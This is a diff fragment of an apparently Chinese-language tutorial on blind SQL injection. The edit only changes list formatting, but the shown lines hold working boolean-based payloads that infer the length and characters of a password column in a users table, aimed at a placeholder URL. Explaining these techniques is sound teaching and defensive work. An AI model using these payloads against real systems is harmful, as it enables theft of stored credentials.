@@ -98,15 +98,15 @@ http://example.com/item?id=1 AND 1=2   --> 页面异常或不同
 
 使用逐字符猜测字段值：
 
-- 假设字段 ```password```在表```users```中：
+ 假设字段 ```password```在表```users```中：
 
-  - 获取字段值长度：
+  获取字段值长度：
 
     ```sql
     id=1 AND LENGTH((SELECT password FROM users LIMIT 0,1))=8
     ```
 
-  - 获取字段值字符：
+  获取字段值字符：
 
     ```sql
     id=1 AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='p'
